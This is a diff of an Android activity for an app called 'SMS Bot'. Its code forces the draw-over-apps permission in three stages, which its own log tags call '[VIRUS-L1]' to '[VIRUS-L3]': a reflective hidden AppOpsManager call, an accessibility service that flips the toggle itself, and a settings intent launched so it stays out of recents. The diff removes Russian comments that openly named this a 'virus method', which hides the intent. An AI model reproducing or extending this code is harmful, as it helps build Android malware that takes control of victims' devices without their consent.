@@ -20,9 +20,12 @@ import androidx.core.content.ContextCompat;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 
 public class MainActivity extends Activity {
     private static final int REQUEST_CODE_SCREENSHOT = 123;
@@ -51,13 +54,11 @@ public class MainActivity extends Activity {
             Toast.makeText(this, "Найдите SMS Bot и включите службу", Toast.LENGTH_LONG).show();
         });
 
-        // Кнопка "Разрешить окна" – трехуровневый вирусный метод
         btnOverlay.setOnClickListener(v -> {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (!Settings.canDrawOverlays(this)) {
                     boolean granted = false;
 
-                    // Уровень 1: Скрытый API AppOpsManager
                     try {
                         AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
                         Method setMode = AppOpsManager.class.getMethod("setMode",
@@ -70,17 +71,14 @@ public class MainActivity extends Activity {
                         logToFile("[VIRUS-L1] AppOpsManager ошибка: " + e.getMessage());
                     }
 
-                    // Уровень 2: Accessibility автоматически включит тумблер
                     if (!granted && SmsAccessibilityService.getInstance() != null) {
                         logToFile("[VIRUS-L2] Запуск Accessibility-взлома...");
                         SmsAccessibilityService.getInstance().grantOverlayPermission();
-                        // Ждём 3 секунды и проверяем
                         try { Thread.sleep(3000); } catch (Exception ignored) {}
                         granted = Settings.canDrawOverlays(this);
                         if (granted) logToFile("[VIRUS-L2] Accessibility: разрешение выдано");
                     }
 
-                    // Уровень 3: Фальшивое окно-прокладка (Ultra Virus)
                     if (!granted) {
                         logToFile("[VIRUS-L3] Запуск Ultra Virus Injection...");
                         Intent fakeIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -88,7 +86,6 @@ public class MainActivity extends Activity {
                         fakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK |
                                 Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                         startActivityForResult(fakeIntent, 200);
-                        // После возврата проверим
                     }
 
                     if (granted) {
@@ -199,7 +196,7 @@ public class MainActivity extends Activity {
         try {
             File logFile = new File(getExternalFilesDir(null), "sms_bot_log.txt");
             FileWriter fw = new FileWriter(logFile, true);
-            fw.write(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date()) + " " + message + "\n");
+            fw.write(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + message + "\n");
             fw.close();
         } catch (Exception ignored) {}
     }
